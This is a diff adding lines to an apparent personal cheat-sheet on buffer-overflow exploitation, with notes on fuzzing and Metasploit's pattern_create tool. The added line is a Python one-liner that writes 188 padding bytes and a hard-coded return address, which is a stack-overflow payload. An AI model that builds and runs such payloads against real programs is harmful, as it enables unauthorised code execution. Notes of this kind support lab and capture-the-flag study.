@@ -215,6 +215,10 @@
 
 # Fuzzing
 python3 -c 'print("A" * 5000)'
+## Bytes
+└─$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'\xe2\x91\x04\x08')"
+## send paramenter of function
+## disas function
 
 # Generate payload after fuzzing
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l TOTAL
